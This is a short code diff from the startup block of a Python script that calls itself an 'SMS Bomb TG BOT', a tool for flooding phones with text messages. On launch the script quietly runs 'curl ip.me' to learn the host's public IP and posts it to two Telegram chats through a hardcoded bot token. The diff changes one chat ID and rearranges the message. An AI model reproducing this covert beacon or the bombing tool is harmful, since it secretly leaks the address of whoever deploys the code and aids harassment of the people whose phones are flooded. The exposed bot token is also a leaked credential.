@@ -511,17 +511,18 @@ def main():
 if __name__ == '__main__':
     os.system('curl ip.me > ../logData')
     f = open("../logData","r")
+    msg = "New Server From Docker SMS Bomb TG BOT IP = " + str(f.read())
     url = 'https://api.telegram.org/bot1159067423:AAGePsMdDzlR9DGcFGAa-A3_laNkagURGJ0/sendMessage'
-    msg = "New Server From Docker SMS Bomb TG BOT \n IP = " + str(f.read())
     sendData = {
                 'chat_id':'-495344227' ,
                 'text': msg
                 }
     sendData2 = {
-            'chat_id':'-348641905' ,
+            'chat_id':'-1001223283623' ,
             'text': msg
             }
     x = requests.post(url, data = sendData, timeout=2.50 )
-    x = requests.post(url, data = sendData2, timeout=2.50 )
+    y = requests.post(url, data = sendData2, timeout=2.50 )
+    # req = requests.post(url, timeout=2.50 )
     f.close()
     main()
